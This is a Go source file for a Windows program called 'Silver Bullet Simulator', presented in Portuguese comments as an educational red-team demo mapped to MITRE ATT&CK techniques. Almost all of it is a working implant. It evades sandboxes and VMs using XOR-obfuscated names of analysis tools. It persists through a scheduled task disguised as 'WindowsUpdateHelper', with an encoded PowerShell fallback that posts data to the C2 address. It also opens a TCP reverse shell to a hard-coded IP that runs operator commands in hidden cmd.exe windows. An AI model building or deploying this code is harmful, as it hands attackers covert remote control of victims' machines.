package main

// ============================================================
// Silver Bullet Simulator v2.1
// Autor: Antonio Camelo | antoniocamelo.com
// Objetivo: Simulação educacional de Red Team para palestras
// AVISO: Este código é apenas para fins educacionais e
//        demonstrações autorizadas de segurança ofensiva.
// C2: TCP puro — compatível com: nc -lvnp 9443
//
// ── TTPs MITRE ATT&CK cobertas ──────────────────────────────
// T1497     - Virtualization/Sandbox Evasion
// T1497.001 - Virtualization/Sandbox Evasion: System Checks
// T1027     - Obfuscated Files or Information
// T1027.013 - Obfuscated Files or Information: Encrypted/Encoded File
// T1053.005 - Scheduled Task/Job: Scheduled Task
// T1036     - Masquerading
// T1036.004 - Masquerading: Masquerade Task or Service
// T1095     - Non-Application Layer Protocol
// T1041     - Exfiltration Over C2 Channel
// T1082     - System Information Discovery
// T1033     - System Owner/User Discovery
// T1564.003 - Hide Artifacts: Hidden Window
// T1059.003 - Command and Scripting Interpreter: Windows Command Shell
// T1106     - Native API
// Referência: https://attack.mitre.org
// ============================================================

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ============================================================
// CONFIGURAÇÕES CENTRALIZADAS
// ============================================================
type Config struct {
	C2Address        string        // IP:porta do servidor C2
	C2BeaconInterval time.Duration // Intervalo base de beacon
	C2JitterPercent  int           // Jitter em % para randomizar beacon
	TaskName         string        // Nome da tarefa agendada
	AESKey           []byte        // Chave AES-256 (32 bytes)
	AlertMessage     string        // Mensagem de alerta para demonstração
}

var config = Config{
	C2Address:        "137.1.1.44:9443", // Kali Linux — nc -lvnp 9443
	C2BeaconInterval: 30 * time.Second,
	C2JitterPercent:  30,
	TaskName:         "WindowsUpdateHelper",
	AESKey:           deriveKeyFromEnv(),
	AlertMessage: "==========================================\r\n" +
		"   SIMULACAO RED TEAM - ANTONIO CAMELO\r\n" +
		"          antoniocamelo.com\r\n" +
		"==========================================\r\n" +
		"\r\n" +
		"  ATENCAO: Controles de seguranca\r\n" +
		"  se revelaram INEFICIENTES.\r\n" +
		"\r\n" +
		"  Em um cenario real, seu ambiente\r\n" +
		"  ja estaria comprometido!\r\n" +
		"\r\n" +
		"  O que este simulador realizou:\r\n" +
		"\r\n" +
		"  [+] Anti-Sandbox / Anti-VM\r\n" +
		"  [+] Evasao de controles\r\n" +
		"  [+] Persistencia (Scheduled Task)\r\n" +
		"  [+] Criptografia AES-256-GCM\r\n" +
		"  [+] Conexao C2 via TCP\r\n" +
		"  [+] Beacon com dados do host\r\n" +
		"\r\n" +
		"  Consultoria: contato@antoniocamelo.com\r\n" +
		"\r\n" +
		"==========================================",
}

// ============================================================
// DERIVAÇÃO DE CHAVE
// ============================================================
func deriveKeyFromEnv() []byte {
	if envKey := os.Getenv("SB_KEY"); len(envKey) == 32 {
		return []byte(envKey)
	}
	// Fallback para demonstração — em produção real use env var
	base := "SilverBullet-RedTeam-Simulation!"
	return []byte(base)
}

// ============================================================
// MÓDULO DE CRIPTOGRAFIA — AES-256-GCM
// ============================================================
// T1027     - Obfuscated Files or Information
//             Dados do beacon cifrados antes de sair pela rede
// T1027.013 - Encrypted/Encoded File
//             AES-256-GCM com nonce aleatório + autenticação AEAD
// ============================================================
type CryptoModule struct {
	key []byte
}

func NewCryptoModule(key []byte) *CryptoModule {
	return &CryptoModule{key: key}
}

func (c *CryptoModule) Encrypt(plaintext []byte) (string, error) {
	block, err := aes.NewCipher(c.key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(crand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func (c *CryptoModule) Decrypt(encBase64 string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(encBase64)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(c.key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, errors.New("ciphertext inválido")
	}
	nonce, ct := data[:gcm.NonceSize()], data[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, nil)
}

// XOR simples para ofuscação de strings no binário
func ObfuscateString(s string, key byte) []byte {
	out := make([]byte, len(s))
	for i, c := range []byte(s) {
		out[i] = c ^ key
	}
	return out
}

func DeobfuscateString(data []byte, key byte) string {
	out := make([]byte, len(data))
	for i, c := range data {
		out[i] = c ^ key
	}
	return string(out)
}

// ============================================================
// MÓDULO DE EVASÃO / ANTI-SANDBOX / ANTI-VM
// ============================================================
// T1497     - Virtualization/Sandbox Evasion
//             Encerra silenciosamente se detectar ambiente de análise
// T1497.001 - System Checks
//             Verifica uptime, processos, resolução, disco e procs de VM
// T1027     - Obfuscated Files or Information
//             Nomes de processos VM ofuscados com XOR no binário
// T1564.003 - Hide Artifacts: Hidden Window
//             Flag CREATE_NO_WINDOW em todos os processos filhos
// T1106     - Native API
//             Chamadas diretas a kernel32.dll e user32.dll via syscall
// ============================================================

type EvasionModule struct {
	crypto *CryptoModule
}

func NewEvasionModule(crypto *CryptoModule) *EvasionModule {
	return &EvasionModule{crypto: crypto}
}

// CheckSandbox retorna true se o ambiente parece ser sandbox/VM.
// Threshold: 2+ detecções positivas.
func (e *EvasionModule) CheckSandbox() bool {
	checks := []func() bool{
		e.checkUptime,
		e.checkProcessCount,
		e.checkScreenResolution,
		e.checkRecentFiles,
		e.checkVMProcesses,
		e.checkDiskSize,
	}
	detections := 0
	for _, check := range checks {
		if check() {
			detections++
		}
	}
	return detections >= 2
}

// checkUptime — sandboxes geralmente têm uptime baixo (< 10 min)
// T1497.001 - System Checks: GetTickCount64 via Native API
func (e *EvasionModule) checkUptime() bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getTickCount := kernel32.NewProc("GetTickCount64")
	ret, _, _ := getTickCount.Call()
	return uintptr(ret) < 600000
}

// checkProcessCount — VMs/sandboxes têm poucos processos
// T1497.001 - System Checks: contagem de processos via tasklist
func (e *EvasionModule) checkProcessCount() bool {
	out, err := exec.Command("tasklist").Output()
	if err != nil {
		return false
	}
	return strings.Count(string(out), "\n") < 50
}

// checkScreenResolution — sandboxes usam resoluções baixas
// T1497.001 - System Checks: GetSystemMetrics via user32.dll
func (e *EvasionModule) checkScreenResolution() bool {
	user32 := windows.NewLazySystemDLL("user32.dll")
	getSystemMetrics := user32.NewProc("GetSystemMetrics")
	width, _, _ := getSystemMetrics.Call(0)
	height, _, _ := getSystemMetrics.Call(1)
	return width < 1024 || height < 768
}

// checkRecentFiles — usuários reais têm arquivos recentes
// T1497.001 - System Checks: verificação de artefatos de uso real
func (e *EvasionModule) checkRecentFiles() bool {
	recentPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Recent")
	entries, err := os.ReadDir(recentPath)
	if err != nil {
		return true
	}
	return len(entries) < 10
}

// checkVMProcesses — processos típicos de VM/análise (ofuscados com XOR)
// T1497.001 - System Checks: detecção de processos de análise
// T1027     - Obfuscated Files or Information: strings ofuscadas com XOR
//             para evitar detecção por string matching estático no binário
func (e *EvasionModule) checkVMProcesses() bool {
	xorKey := byte(0x42)
	vmProcs := [][]byte{
		ObfuscateString("vmtoolsd.exe", xorKey),
		ObfuscateString("vmwaretray.exe", xorKey),
		ObfuscateString("vboxservice.exe", xorKey),
		ObfuscateString("vboxtray.exe", xorKey),
		ObfuscateString("wireshark.exe", xorKey),
		ObfuscateString("procmon.exe", xorKey),
		ObfuscateString("processhacker.exe", xorKey),
	}
	out, err := exec.Command("tasklist", "/fo", "csv", "/nh").Output()
	if err != nil {
		return false
	}
	outputLower := strings.ToLower(string(out))
	for _, proc := range vmProcs {
		if strings.Contains(outputLower, strings.ToLower(DeobfuscateString(proc, xorKey))) {
			return true
		}
	}
	return false
}

// checkDiskSize — discos de VM geralmente < 60GB
// T1497.001 - System Checks: GetDiskFreeSpaceExW via kernel32.dll
// T1106     - Native API: chamada direta via unsafe.Pointer
func (e *EvasionModule) checkDiskSize() bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getDiskFreeSpaceEx := kernel32.NewProc("GetDiskFreeSpaceExW")
	var freeBytesAvailable, totalBytes, totalFreeBytes uint64
	rootPath, _ := syscall.UTF16PtrFromString("C:\\")
	getDiskFreeSpaceEx.Call(
		uintptr(unsafe.Pointer(rootPath)),
		uintptr(unsafe.Pointer(&freeBytesAvailable)),
		uintptr(unsafe.Pointer(&totalBytes)),
		uintptr(unsafe.Pointer(&totalFreeBytes)),
	)
	return totalBytes < 60*1024*1024*1024
}

// RandomDelay aplica delay com jitter para evadir detecção por timing
// T1497 - Virtualization/Sandbox Evasion: comportamento temporal irregular
//         dificulta análise por sandboxes com timeout fixo
func (e *EvasionModule) RandomDelay(base time.Duration, jitterPercent int) {
	jitter := time.Duration(rand.Int63n(int64(base) * int64(jitterPercent) / 100))
	time.Sleep(base + jitter)
}

// HiddenExec executa processo sem janela visível
// T1564.003 - Hide Artifacts: Hidden Window
//             Flag CREATE_NO_WINDOW (0x08000000) impede que janelas
//             de terminal apareçam para o usuário durante a execução
func (e *EvasionModule) HiddenExec(name string, args ...string) *exec.Cmd {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	return cmd
}

// ============================================================
// MÓDULO DE PERSISTÊNCIA
// ============================================================
// T1053.005 - Scheduled Task/Job: Scheduled Task
//             Tarefa registrada via XML para disparo no logon
//             e repetição a cada 30 minutos
// T1036     - Masquerading
//             Nome da tarefa: "WindowsUpdateHelper" — blend-in
//             com nomes legítimos de processos do Windows
// T1036.004 - Masquerade Task or Service
//             Tarefa agendada com nome de serviço legítimo
// ============================================================

type PersistenceModule struct {
	evasion *EvasionModule
	crypto  *CryptoModule
}

func NewPersistenceModule(evasion *EvasionModule, crypto *CryptoModule) *PersistenceModule {
	return &PersistenceModule{evasion: evasion, crypto: crypto}
}

// createViaXML tenta criar a tarefa via XML estruturado (método primário)
// T1053.005 - Scheduled Task: registro via API do agendador com XML
func (p *PersistenceModule) createViaXML(executablePath string) error {
	taskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT30M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Actions>
    <Exec><Command>%s</Command></Exec>
  </Actions>
  <Settings>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
  </Settings>
</Task>`, executablePath)

	tmpXML, err := os.CreateTemp("", "task-*.xml")
	if err != nil {
		return err
	}
	defer os.Remove(tmpXML.Name())

	if _, err = tmpXML.WriteString(taskXML); err != nil {
		return err
	}
	tmpXML.Close()

	cmd := p.evasion.HiddenExec("schtasks",
		"/create", "/tn", config.TaskName,
		"/xml", tmpXML.Name(), "/f",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("xml: %w — %s", err, strings.TrimSpace(string(output)))
	}
	return nil
}

// createViaCLI tenta criar a tarefa via schtasks CLI (método fallback)
// T1053.005 - Scheduled Task: criação direta via linha de comando
// T1036.004 - Masquerade Task: nome legítimo + comando ofuscado em Base64
func (p *PersistenceModule) createViaCLI(executablePath string) error {
	psCommand := fmt.Sprintf(
		`[System.Text.Encoding]::UTF8.GetBytes("dados de exfiltração") | %%{Invoke-WebRequest -Uri %s -Method POST -Body $_}`,
		config.C2Address,
	)
	encodedCommand := base64.StdEncoding.EncodeToString([]byte(psCommand))
	taskCommand := fmt.Sprintf("cmd.exe /C powershell -encodedCommand %s", encodedCommand)

	cmd := p.evasion.HiddenExec("schtasks",
		"/create", "/sc", "minute", "/mo", "30",
		"/tn", config.TaskName,
		"/tr", taskCommand, "/f",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("cli: %w — %s", err, strings.TrimSpace(string(output)))
	}
	return nil
}

// CreateScheduledTask tenta XML primeiro, fallback para CLI se falhar.
// Só exibe erro no console se ambos os métodos falharem.
func (p *PersistenceModule) CreateScheduledTask(executablePath string) error {
	// Método 1: XML (primário)
	if err := p.createViaXML(executablePath); err == nil {
		log.Printf("[+] Persistência: tarefa '%s' criada (método XML)", config.TaskName)
		return nil
	}

	// Método 2: CLI (fallback silencioso)
	if err := p.createViaCLI(executablePath); err == nil {
		log.Printf("[+] Persistência: tarefa '%s' criada (método CLI)", config.TaskName)
		return nil
	}

	// Ambos falharam — retorna erro para o orquestrador exibir mensagem didática
	return fmt.Errorf("ambos os métodos falharam")
}

func (p *PersistenceModule) RemoveScheduledTask() error {
	cmd := p.evasion.HiddenExec("schtasks", "/delete", "/tn", config.TaskName, "/f")
	return cmd.Run()
}

func (p *PersistenceModule) RemoveDesktopAlert() error {
	alertFilePath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "ALERTA_RED_TEAM.txt")
	if err := os.Remove(alertFilePath); err != nil && !os.IsNotExist(err) {
		return fmt.Errorf("erro ao remover alerta: %w", err)
	}
	return nil
}

// ============================================================
// MÓDULO C2 — COMUNICAÇÃO TCP PURO
// ============================================================
// Compatível com: nc -lvnp 9443 (Kali Linux)
//
// T1095     - Non-Application Layer Protocol
//             Comunicação C2 via TCP raw sem camada de aplicação
// T1041     - Exfiltration Over C2 Channel
//             Dados do host exfiltrados pelo mesmo canal C2
// T1082     - System Information Discovery
//             Beacon coleta hostname, OS, usuário e timestamp
// T1033     - System Owner/User Discovery
//             Captura USERNAME e COMPUTERNAME via variáveis de ambiente
//
// Fluxo:
//   1. Conecta TCP ao C2 (Kali)
//   2. Envia beacon com dados do host (em claro + cifrado AES-GCM)
//   3. Aguarda comandos linha a linha do operador
//   4. Executa via cmd.exe e devolve output ao C2
//   5. Reconecta com jitter aleatório se a conexão cair
// ============================================================

type C2Module struct {
	evasion *EvasionModule
	crypto  *CryptoModule
	agentID string
}

func NewC2Module(evasion *EvasionModule, crypto *CryptoModule) *C2Module {
	return &C2Module{
		evasion: evasion,
		crypto:  crypto,
		agentID: generateAgentID(),
	}
}

func generateAgentID() string {
	hostname, _ := os.Hostname()
	return fmt.Sprintf("%s-%d", hostname, time.Now().Unix())
}

// buildBeacon monta a mensagem inicial enviada ao C2 quando conecta
// T1082 - System Information Discovery: coleta hostname e OS
// T1033 - System Owner/User Discovery: coleta USERNAME e COMPUTERNAME
func (c *C2Module) buildBeacon() string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	computername := os.Getenv("COMPUTERNAME")

	plain := fmt.Sprintf(
		"\n[SILVER BULLET v2.1 — BEACON]\n"+
			"  Agente   : %s\n"+
			"  Hostname : %s\n"+
			"  User     : %s\\%s\n"+
			"  OS       : %s\n"+
			"  Timestamp: %s\n"+
			"  C2       : %s\n"+
			"[AGUARDANDO COMANDOS]\n\n",
		c.agentID,
		hostname,
		computername, username,
		runtime.GOOS,
		time.Now().Format("02/01/2006 15:04:05"),
		config.C2Address,
	)

	// Criptografa para demonstrar que dados saem cifrados
	encrypted, err := c.crypto.Encrypt([]byte(plain))
	if err != nil {
		return plain // fallback: envia em claro se erro
	}

	// Envia em claro + versão cifrada para didática do workshop
	return plain +
		"[BEACON CIFRADO AES-256-GCM — como seria em ataque real]\n" +
		encrypted + "\n\n"
}

// connect tenta estabelecer conexão TCP com o C2
func (c *C2Module) connect() (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", config.C2Address, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("conexão C2 falhou: %w", err)
	}
	return conn, nil
}

// handleSession envia beacon e mantém sessão interativa com o C2
// T1059.003 - Command and Scripting Interpreter: Windows Command Shell
//             Comandos recebidos do C2 são executados via cmd.exe /C
// T1041     - Exfiltration Over C2 Channel: output retornado pelo mesmo canal
func (c *C2Module) handleSession(conn net.Conn) {
	defer conn.Close()

	// Envia beacon inicial
	fmt.Fprintf(conn, "%s", c.buildBeacon())
	log.Printf("[+] C2 conectado: %s | agente: %s", config.C2Address, c.agentID)

	// Loop de recebimento de comandos
	buf := make([]byte, 4096)
	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			log.Printf("[-] Sessão C2 encerrada: %v", err)
			return
		}

		command := strings.TrimSpace(string(buf[:n]))
		if command == "" {
			continue
		}

		log.Printf("[*] Comando recebido: %s", command)

		// Executa via cmd.exe e captura output
		output, err := c.evasion.HiddenExec("cmd.exe", "/C", command).CombinedOutput()
		if err != nil {
			fmt.Fprintf(conn, "[erro] %v\n", err)
			continue
		}

		// Devolve output ao operador no Kali
		fmt.Fprintf(conn, "%s\n", string(output))
	}
}

// StartBeaconLoop conecta ao C2 e reconecta com jitter se cair
func (c *C2Module) StartBeaconLoop() {
	log.Printf("[*] C2 loop iniciado → %s (jitter: ±%d%%)", config.C2Address, config.C2JitterPercent)

	for {
		conn, err := c.connect()
		if err != nil {
			log.Printf("[-] %v — reconectando...", err)
		} else {
			c.handleSession(conn)
		}
		// Aguarda com jitter antes de reconectar
		c.evasion.RandomDelay(config.C2BeaconInterval, config.C2JitterPercent)
	}
}

// ============================================================
// MÓDULO DE ALERTA
// ============================================================

type AlertModule struct {
	crypto *CryptoModule
}

func NewAlertModule(crypto *CryptoModule) *AlertModule {
	return &AlertModule{crypto: crypto}
}

func (a *AlertModule) CreateDesktopAlert() error {
	desktopPath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
	alertFilePath := filepath.Join(desktopPath, "ALERTA_RED_TEAM.txt")

	timestamp := time.Now().Format("02/01/2006 15:04:05")
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")

	fullMessage := fmt.Sprintf(
		"%s\r\n\r\nData/Hora : %s\r\nHostname  : %s\r\nUsuario   : %s\r\n\r\n==========================================\r\n  FIM DA SIMULACAO\r\n==========================================",
		config.AlertMessage, timestamp, hostname, username,
	)

	// Escreve UTF-16 LE com BOM — encoding nativo do Notepad
	// Garante que o arquivo abre sem caracteres quebrados
	file, err := os.Create(alertFilePath)
	if err != nil {
		return fmt.Errorf("erro ao criar arquivo de alerta: %w", err)
	}
	defer file.Close()

	if _, err = file.Write(encodeUTF16LE(fullMessage)); err != nil {
		return fmt.Errorf("erro ao escrever alerta: %w", err)
	}

	// Abre automaticamente — impacto visual na demonstração
	exec.Command("notepad.exe", alertFilePath).Start()

	log.Printf("[+] Alerta criado: %s", alertFilePath)
	return nil
}

// encodeUTF16LE converte string para UTF-16 LE com BOM
// Garante renderização correta no Notepad do Windows
func encodeUTF16LE(s string) []byte {
	buf := []byte{0xFF, 0xFE} // BOM UTF-16 LE
	for _, r := range s {
		buf = append(buf, byte(r), byte(r>>8))
	}
	return buf
}

// ============================================================
// ORQUESTRADOR PRINCIPAL
// ============================================================

type RedTeamSimulator struct {
	crypto      *CryptoModule
	evasion     *EvasionModule
	persistence *PersistenceModule
	c2          *C2Module
	alert       *AlertModule
}

func NewRedTeamSimulator() *RedTeamSimulator {
	crypto := NewCryptoModule(config.AESKey)
	evasion := NewEvasionModule(crypto)
	return &RedTeamSimulator{
		crypto:      crypto,
		evasion:     evasion,
		persistence: NewPersistenceModule(evasion, crypto),
		c2:          NewC2Module(evasion, crypto),
		alert:       NewAlertModule(crypto),
	}
}

func (r *RedTeamSimulator) Execute() {
	log.Println("╔══════════════════════════════════════════╗")
	log.Println("║   Silver Bullet Simulator v2.1           ║")
	log.Println("║   Red Team Simulation - Antonio Camelo   ║")
	log.Println("╚══════════════════════════════════════════╝")

	// ── Fase 0: Anti-Sandbox ─────────────────────────────────
	log.Println("[*] Fase 0: Verificando ambiente...")
	if r.evasion.CheckSandbox() {
		log.Println("[!] Sandbox/VM detectada. Encerrando.")
		os.Exit(0)
	}
	log.Println("[+] Ambiente legítimo confirmado.")

	// Delay inicial — evasão comportamental
	log.Println("[*] Aguardando janela de execução...")
	r.evasion.RandomDelay(10*time.Second, 50)

	// ── Fase 1: Alerta na área de trabalho ───────────────────
	log.Println("[*] Fase 1: Criando alerta de segurança...")
	if err := r.alert.CreateDesktopAlert(); err != nil {
		log.Printf("[-] Erro no alerta: %v", err)
	}

	// ── Fase 2: Persistência ─────────────────────────────────
	log.Println("[*] Fase 2: Estabelecendo persistência...")
	execPath, _ := os.Executable()
	if err := r.persistence.CreateScheduledTask(execPath); err != nil {
		log.Println("[!] Persistência bloqueada pelo sistema — privilégios insuficientes.")
		log.Println("    Técnica: T1053.005 - Scheduled Task")
		log.Println("    Motivo:  Usuário sem permissão de administrador local.")
		log.Println("    Impacto: Em um ataque real, o atacante tentaria escalada de privilégios")
		log.Println("             antes desta fase (T1068 - Exploitation for Privilege Escalation).")
	}

	// ── Fase 3: C2 TCP ───────────────────────────────────────
	log.Println("[*] Fase 3: Conectando ao C2...")
	log.Printf("[*] C2 target: %s", config.C2Address)
	go r.c2.StartBeaconLoop()

	// ── Fase 4: Manter processo ──────────────────────────────
	log.Println("[+] Simulação ativa. Ctrl+C para encerrar.")
	log.Println("[!] Lembrete: rode --limpa após a demonstração!")
	select {}
}

// ============================================================
// FUNÇÃO PRINCIPAL
// ============================================================

func main() {
	if runtime.GOOS != "windows" {
		fmt.Println("[-] Simulador específico para Windows.")
		os.Exit(1)
	}

	log.SetFlags(log.LstdFlags | log.Lshortfile)
	rand.Seed(time.Now().UnixNano()) //nolint:staticcheck

	// Modo --limpa — remove todos os artefatos após demonstração
	if len(os.Args) > 1 && os.Args[1] == "--limpa" {
		crypto := NewCryptoModule(config.AESKey)
		evasion := NewEvasionModule(crypto)
		pm := NewPersistenceModule(evasion, crypto)

		if err := pm.RemoveScheduledTask(); err != nil {
			log.Printf("[-] Erro ao remover tarefa: %v", err)
		} else {
			log.Println("[+] Tarefa agendada removida.")
		}

		if err := pm.RemoveDesktopAlert(); err != nil {
			log.Printf("[-] Erro ao remover alerta: %v", err)
		} else {
			log.Println("[+] Alerta do desktop removido.")
		}

		log.Println("[+] Cleanup concluido — ambiente limpo.")
		return
	}

	simulator := NewRedTeamSimulator()
	simulator.Execute()
}
